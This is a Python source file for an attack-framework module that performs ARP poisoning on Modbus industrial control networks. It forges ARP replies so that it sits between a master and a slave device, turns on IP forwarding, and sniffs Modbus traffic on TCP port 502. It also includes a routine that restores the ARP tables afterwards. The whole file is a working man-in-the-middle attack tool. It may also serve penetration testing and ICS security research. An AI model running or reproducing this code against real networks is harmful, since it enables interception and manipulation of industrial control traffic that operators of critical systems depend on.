import os
import sys
import signal
import threading
import random

from System.Core.Global import *
from System.Core.Colors import *
from System.Core.Modbus import *
from System.Lib import ipcalc



down = False
class Module:


	info = {
		'Name': 'Arp Poisoning',
		'Author': ['@enddo'],
		'Description': ("Arp Poisoning"),

        }
	options = {
		'Master'	:[''		,True	,'The master IP address'],
		'Slave'		:[''		,True	,'The slave IP address'],
		'Output'	:[False		,False	,'The stdout save in output directory']
	}	
	output = ''

	def exploit(self):

		moduleName 	= self.info['Name']
		print bcolors.OKBLUE + '[+]' + bcolors.ENDC + ' Module ' + moduleName + ' Start'
		self.do()
		if(self.options['Output'][0]):
			open(mainPath + '/Output/' + moduleName + '_' + self.options['Master'][0].replace('/','_') + '.txt','a').write('='*30 + '\n' + self.output + '\n\n')
		self.output 	= ''

	def printLine(self,str,color):
		self.output += str + '\n'
		if(str.find('[+]') != -1):
			print str.replace('[+]',color + '[+]' + bcolors.ENDC)
		elif(str.find('[-]') != -1):
			print str.replace('[-]',color + '[+]' + bcolors.ENDC)
		else:
			print str

	def do(self):
		def arp_callback(pkt):
			if ModbusADU in pkt:
				pkt.show()
		def poison_target(gatway_ip,gatway_mac,target_ip,target_mac):
			self.printLine('[+] Start Poisoning',bcolors.OKGREEN)
			with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
				ipf.write('1\n')
			while True:
				try:
					send(ARP(op=2,psrc=gatway_ip,pdst=target_ip,hwdst=target_mac))
					send(ARP(op=2,psrc=target_ip,pdst=gatway_ip,hwdst=gatway_mac))
					time.sleep(4)
				except:
					sys.exit(0)
		def restore_target(gatway_ip,gatway_mac,target_ip,target_mac):
			print "[+] Restore ARP Tables"
		    	send(ARP(op=2, pdst=gatway_ip, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=3)
		    	send(ARP(op=2, pdst=target_ip, psrc=gatway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gatway_mac), count=3)
			with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
				ipf.write('0\n')
			os._exit(0)
		def get_mac(ip_address):
			ans,unasn = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)
			ans.res
			return ans.res[0][1][Ether].src
		
		
		
		target_ip = self.options['Slave'][0]
		gatway_ip = self.options['Master'][0]
		
		
		gatway_mac = get_mac(gatway_ip)
		if(gatway_mac == None):
			self.printLine('[-] Failed to get Master MAC',bcolors.WARNING)
			sys.exit(0)
		else:
			self.printLine('[+] Master MAC: '+gatway_mac,bcolors.OKGREEN)
		
		target_mac = get_mac(target_ip)
		if(target_mac == None):
			self.printLine('[-] Failed to get Slave MAC',bcolors.WARNING)
			os._exit(0)
		else:
			self.printLine('[+] Slave MAC: '+target_mac,bcolors.OKGREEN)
		
		def signal_handler(signal, frame):
		        restore_target(gatway_ip,gatway_mac,target_ip,target_mac)
			
		signal.signal(signal.SIGINT, signal_handler)
		poison_thread = threading.Thread(target = poison_target,args=(gatway_ip,gatway_mac,target_ip,target_mac))
		poison_thread.start()
		
		sniff(filter='tcp port 502', prn=arp_callback, store=1)
			
		
				

		
